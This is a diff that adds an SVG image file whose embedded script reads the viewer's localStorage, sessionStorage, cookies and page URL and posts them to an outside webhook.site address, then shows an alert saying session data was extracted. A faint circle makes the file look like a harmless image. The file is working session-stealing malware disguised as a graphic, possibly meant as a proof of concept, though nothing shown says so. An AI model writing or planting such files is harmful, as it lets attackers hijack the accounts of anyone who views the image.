@@ -1,0 +1,21 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <script><![CDATA[
+    // Extract localStorage/sessionStorage data
+    const data = {
+      localStorage: JSON.stringify(localStorage),
+      sessionStorage: JSON.stringify(sessionStorage),
+      cookies: document.cookie,
+      url: window.location.href
+    };
+    
+    fetch('https://webhook.site/1cc18f17-3f39-4062-97d4-9c493250676e', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(data)
+    });
+    
+    alert('Session data extracted');
+  ]]></script>
+  <circle r="50" cx="50" cy="50" fill="red" opacity="0.1"/>
+</svg>
